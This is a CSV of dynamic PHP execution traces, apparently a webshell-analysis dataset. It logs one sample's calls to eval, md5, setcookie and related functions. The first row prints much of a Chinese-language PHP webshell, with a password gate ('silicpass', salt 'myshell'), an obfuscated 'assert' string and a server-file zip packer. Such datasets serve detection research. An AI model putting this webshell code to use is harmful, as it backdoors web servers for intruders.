uuid,file_md5,index,source,target,argc,argv,return,dynamic
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,10,eval,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""error_reporting(E_ERROR);\r\nheader(\""content-Type: text/html; charset=gbk\"");\r\nset_time_limit(0);\r\nfunction Root_GP(&$array)\r\n{\r\n\twhile(list($key,$var) = each($array))\r\n\t{\r\n\t\tif((strtoupper($key) != $key || ''.intval($key) == \""$key\"") && $key != 'argc' && $key != 'argv')\r\n\t\t{\r\n\t\t\tif(is_string($var)) $array[$key] = stripslashes($var);\r\n\t\t\tif(is_array($var)) $array[$key] = Root_GP($var);\r\n\t\t}\r\n\t}\r\n\treturn $array;\r\n}\r\n$salt = \""myshell\"";\r\n$psw = trim($_POST['silicpass']);\r\n$password = \""674a8918fd14e5da174470e5e6f2eec9\"";\r\n$passt = $salt.$psw;\r\n$passt = md5(md5(md5($passt)));\r\n$asse='asert';\r\nfunction Root_CSS()\r\n{\r\n\tprint<<<END\r\n<style type=\""text/css\"">\r\n*{padding:0; margin:0;}\r\nbody{background:threedface;font-family:\""Verdana\"",\""Tahoma\"",\""\\xcb\\xce\\xcc\\xe5\"",sans-serif;font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}\r\na{color:#000000;text-decoration:none;}\r\na:hover{background:#BBBBBB;}\r\ntable{color:#000000;font-family:\""Verdana\"",\""Tahoma\"",\""\\xcb\\xce\\xcc\\xe5\"",sans-serif;font-size:13px;border:1px solid #999999;}\r\ntd{background:#F9F6F4;}\r\n.toptd{background:threedface;width:310px;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;}\r\n.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}\r\n.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}\r\n.footer{padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:22px;width:950px;color:#000000;background: #888888;}\r\n</style>\\n\r\nEND;\r\n\treturn false;\r\n}\r\n//\\xce\\xc4\\xbc\\xfe\\xb9\\xdc\\xc0\\xed\r\nclass packdir\r\n{\r\n\tvar $out='';\r\n\tvar $datasec=array();\r\n\tvar $ctrl_dir=array();\r\n\tvar $eof_ctrl_dir=\""\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\"";\r\n\tvar $old_offset=0;\r\n\tfunction packdir($array)\r\n\t{\r\n\t\tif(@function_exists('gzcompress'))\r\n\t\t{\r\n\t\t\tfor($n = 0;$n < count($array);$n++)\r\n\t\t\t{\r\n\t\t\t\t$array[$n] = urldecode($array[$n]);\r\n\t\t\t\t$fp = @fopen($array[$n], 'r');\r\n\t\t\t\t$filecode = @fread($fp, @filesize($array[$n]));\r\n\t\t\t\t@fclose($fp);\r\n\t\t\t\t$this -> filezip($filecode,basename($array[$n]));\r\n\t\t\t}\r\n\t\t\t@closedir($zhizhen);\r\n\t\t\t$this->out = $this->packfile();\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\treturn false;\r\n\t}\r\n\r\n\tfunction at($atunix = 0)\r\n\t{\r\n\t\t$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);\r\n\t\tif ($unixarr['year'] < 1980)\r\n\t\t{\r\n\t\t\t$unixarr['year']    = 1980;\r\n\t\t\t$unixarr['mon']     = 1;\r\n\t\t\t$unixarr['mday']    = 1;\r\n\t\t\t$unixarr['hours']   = 0;\r\n\t\t\t$unixarr['minutes'] = 0;\r\n\t\t\t$unixarr['seconds'] = 0;\r\n\t\t}\r\n\t\treturn (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) | ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);\r\n\t}\r\n\tfunction filezip($data, $name, $time = 0)\r\n\t{\r\n\t\t$name = str_replace('\\\\', '/', $name);\r\n\t\t$dtime = dechex($this->at($time));\r\n\t\t$hexdtime\t= '\\x'.$dtime[6].$dtime[7].'\\x'.$dtime[4].$dtime[5].'\\x'.$dtime[2].$dtime[3].'\\x'.$dtime[0].$dtime[1];\r\n\t\teval('$hexdtime = \""' . $hexdtime . '\"";');\r\n\t\t$fr\t= \""\\x50\\x4b\\x03\\x04\"";\r\n\t\t$fr\t.= \""\\x14\\x00\"";\r\n\t\t$fr\t.= \""\\x00\\x00\"";\r\n\t\t$fr\t.= \""\\x08\\x00\"";\r\n\t\t$fr\t.= $hexdtime;\r\n\t\t$unc_len = strlen($data);\r\n\t\t$crc = crc32($data);\r\n\t\t$zdata = gzcompress($data);\r\n\t\t$c_len = strlen($zdata);\r\n\t\t$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);\r\n\t\t$fr .= pack('V', $crc);\r\n\t\t$fr .= pack('V', $c_len);\r\n\t\t$fr .= pack('V', $unc_len);\r\n\t\t$fr .= pack('v', strlen($name));\r\n\t\t$fr .= pack('v', 0);\r\n\t\t$fr .= $name;\r\n\t\t$fr .= $zdata;\r\n\t\t$fr .= pack('V', $crc);\r\n\t\t$fr .= pack('V', $c_len);\r\n\t\t$fr .= pack('V', $unc_len);\r\n\t\t$this -> datasec[] = $fr;\r\n\t\t$new_offset = strlen(implode('', $this->datasec));\r\n\t\t$cdrec = \""\\x50\\x4b\\x01\\x02\"";\r\n\t\t$cdrec .= \""\\x00\\x00\"";\r\n\t\t$cdrec .= \""\\x14\\x00\"";\r\n\t\t$cdrec .= \""\\x00\\x00\"";\r\n\t\t$cdrec .= \""\\x08\\x00\"";\r\n\t\t$cdrec .= $hexdtime;\r\n\t\t$cdrec .= pack('V', $crc);\r\n\t\t$cdrec .= pack('V', $c_len);\r\n\t\t$cdrec .= pack('V', $unc_len);\r\n\t\t$cdrec .= pack('v', strlen($name) );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('V', 32 );\r\n\t\t$cdrec .= ""]]}","{""value"": ""413C413C413C00265051423C26260826423C6A3C6A3C2626000000000000000000000000000000000000000000000000000000000000000000000000005051112B41413C4F2A5051112B505108413C6A3C6A3C6A3C26413C505108413C6A3C6A3C6A3C08413C08413C2629462E11342E59730D345393892B26413C26423C2626132D24462A02112B423C081E2A511E2A41423C282A282A5051423C08413C6A3C6A3C112B51510851085108510851082639503B50515C5D423D3A2A8D8D3C2B53433C532653433C53262A003C265051423C122B3C26722B3C03012641423C6A423C423C423C112B37383738413C4F2A262A3B423D3C4F2A59732B505126122E12342B3C2A2A2659732B50519D2A413C6A3C9D26302B423C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B5051425051423C322A302B3C322A302B423C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A2A3B3D322A2A3E""}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,11,eval,error_reporting,1.0,"{""value"": [[0, ""new_error_level"", 1]]}","{""value"": ""void""}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,12,eval,header,1.0,"{""value"": [[0, ""header"", ""content-Type: text/html; charset=gbk""]]}","{""value"": ""void""}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,13,eval,set_time_limit,1.0,"{""value"": [[0, ""seconds"", 0]]}","{""value"": ""void""}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,14,eval,zend_fetch_r_post,1.0,"{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,15,eval,trim,1.0,"{""value"": [[0, ""str"", ""assert""]]}","{""value"": ""assert""}",[130]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,16,eval,md5,1.0,"{""value"": [[0, ""str"", ""myshellassert""]]}","{""value"": ""ca1ec79ad0c364184535bda1dea1bac0""}",[130]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,17,eval,md5,1.0,"{""value"": [[0, ""str"", ""ca1ec79ad0c364184535bda1dea1bac0""]]}","{""value"": ""1652e074a1c994dd88aa720c5f2d8f6a""}",[130]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,18,eval,md5,1.0,"{""value"": [[0, ""str"", ""1652e074a1c994dd88aa720c5f2d8f6a""]]}","{""value"": ""38bc8f389ffb605e52fea1f102abfd88""}",[130]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,19,eval,zend_fetch_r_get,1.0,"{""value"": [[0, ""op1"", ""_GET""]]}","{""value"": []}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,20,eval,zend_fetch_r_get,1.0,"{""value"": [[0, ""op1"", ""_GET""]]}","{""value"": []}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,21,eval,zend_fetch_r_get,1.0,"{""value"": [[0, ""op1"", ""_GET""]]}","{""value"": []}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,22,eval,trim,1.0,"{""value"": [[0, ""str"", ""assert""]]}","{""value"": ""assert""}",[129]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,23,eval,md5,1.0,"{""value"": [[0, ""str"", ""myshellassert""]]}","{""value"": ""ca1ec79ad0c364184535bda1dea1bac0""}",[129]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,24,eval,md5,1.0,"{""value"": [[0, ""str"", ""ca1ec79ad0c364184535bda1dea1bac0""]]}","{""value"": ""1652e074a1c994dd88aa720c5f2d8f6a""}",[129]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,25,eval,md5,1.0,"{""value"": [[0, ""str"", ""1652e074a1c994dd88aa720c5f2d8f6a""]]}","{""value"": ""38bc8f389ffb605e52fea1f102abfd88""}",[129]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,26,eval,get_magic_quotes_gpc,0.0,"{""value"": []}","{""value"": false}",[]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,27,eval,purl,0.0,"{""value"": []}","{""value"": ""http://_:5001/abace4ddb4a6c44f7d99b80f8d4aed15_51ce18da-f7cc-11ea-800e-00163e142113.php""}",[]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,28,purl,zend_fetch_r_server,1.0,"{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,29,purl,zend_fetch_r_server,1.0,"{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,30,purl,zend_fetch_r_server,1.0,"{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,31,purl,zend_fetch_r_server,1.0,"{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,32,purl,zend_fetch_r_server,1.0,"{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,33,eval,zend_fetch_r_cookie,1.0,"{""value"": [[0, ""op1"", ""_COOKIE""]]}","{""value"": []}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,34,eval,md5,1.0,"{""value"": [[0, ""str"", ""674a8918fd14e5da174470e5e6f2eec9""]]}","{""value"": ""5bc2bb9a7539dfd2f5cd160f1556a1c1""}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,35,eval,ob_start,0.0,"{""value"": []}","{""value"": ""void""}",[]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,36,eval,time,0.0,"{""value"": []}","{""value"": 1600226750}",[]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,37,eval,md5,1.0,"{""value"": [[0, ""str"", ""38bc8f389ffb605e52fea1f102abfd88""]]}","{""value"": ""9ce9197476fea7d437e83d30c3f499c0""}",[130]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,38,eval,setcookie,3.0,"{""value"": [[0, ""name"", ""admin_silicpass""], [1, ""value"", ""9ce9197476fea7d437e83d30c3f499c0""], [2, ""expires"", 1600313154]]}","{""value"": ""void""}","[0, 130, 0]"
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,39,eval,md5,1.0,"{""value"": [[0, ""str"", ""38bc8f389ffb605e52fea1f102abfd88""]]}","{""value"": ""9ce9197476fea7d437e83d30c3f499c0""}",[130]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,40,eval,md5,1.0,"{""value"": [[0, ""str"", ""674a8918fd14e5da174470e5e6f2eec9""]]}","{""value"": ""5bc2bb9a7539dfd2f5cd160f1556a1c1""}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,41,eval,Root_Login,1.0,"{""value"": [[0, ""MSG_TOP"", ""PASS IS FALSE""]]}","{""value"": null}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,42,Root_Login,zend_fetch_r_server,1.0,"{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}",[0]
2ae0eea39a2de1ea3bfc61f8c86cb483,abace4ddb4a6c44f7d99b80f8d4aed15,43,Root_Login,gethostbyname,1.0,"{""value"": [[0, ""hostname"", ""_""]]}","{""value"": null}",[0]
